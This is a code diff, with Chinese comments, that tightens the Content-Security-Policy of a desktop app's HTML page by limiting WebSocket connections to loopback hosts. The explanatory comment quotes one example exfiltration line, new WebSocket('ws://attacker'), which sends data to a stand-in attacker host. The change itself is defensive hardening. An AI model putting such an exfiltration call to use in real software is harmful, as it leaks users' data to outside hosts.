@@ -13,13 +13,17 @@
           内联 <style> 注入；去掉会让界面无样式。
         - script-src 不加 'unsafe-inline'/'unsafe-eval'：生产包是外部
           module 脚本，无需内联执行；这是最关键的收紧项（阻止注入脚本执行）。
-        - connect-src 放开 http/https：渲染层不直接发起网络请求（一律走
-          IPC），但 dev 模式下 Vite HMR 需要 ws: 与 http://localhost。
+        - connect-src 只留 **loopback**：渲染层不直接发起网络请求（一律走
+          IPC），唯一的例外是 dev 模式下 Vite HMR。R102-A1：此前写的是裸
+          ws:（= 允许 WebSocket 连到**任意** host）——那是一条现成的外带
+          通道：渲染层一旦有代码执行，new WebSocket('ws://attacker') 就能
+          把数据带走，而 CSP 的本职正是堵这个。改为显式 loopback 主机名后，
+          dev 仍能连 HMR，打包后的 file:// 页面连不出去。
         - img-src 允许 data:：组件里的图标/占位可能用 data URI。
     -->
     <meta
       http-equiv="Content-Security-Policy"
-      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self' ws: http://localhost:* http://127.0.0.1:*; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'"
+      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self' ws://localhost:* ws://127.0.0.1:* http://localhost:* http://127.0.0.1:*; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'"
     />
     <title>AutoCodeFlow Executor</title>
   </head>
